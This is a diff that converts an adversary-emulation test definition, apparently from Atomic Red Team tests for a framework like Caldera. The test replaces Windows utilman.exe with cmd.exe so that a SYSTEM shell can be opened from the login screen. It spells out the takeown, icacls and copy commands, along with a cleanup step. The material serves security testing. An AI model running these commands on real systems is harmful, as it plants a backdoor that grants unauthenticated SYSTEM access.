@@ -1,17 +1,16 @@
-- id: b93fd4fb-a60b-5183-902d-40b6208e2e95
+- requirements: []
   name: Soumaia ART Tests - Replace utilman.exe (Ease of Access Binary) with cmd.exe
   description: Replace utilman.exe (Ease of Access binary) with cmd.exe. This allows the user to launch an elevated command prompt by clicking the Ease of Access button on the login screen. (requires elevation)
   tactic: privilege-escalation
-  technique:
-    attack_id: T1546.008
-    name: 'Event Triggered Execution: Accessibility Features'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
-          takeown /F C:\Windows\System32\utilman.exe /A
-          icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
-          copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
-        cleanup: |-
-          copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
+  technique_id: T1546.008
+  technique_name: 'Event Triggered Execution: Accessibility Features'
+  executors:
+  - cleanup:
+    - copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\utilman.exe /A & icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+  id: b93fd4fb-a60b-5183-902d-40b6208e2e95
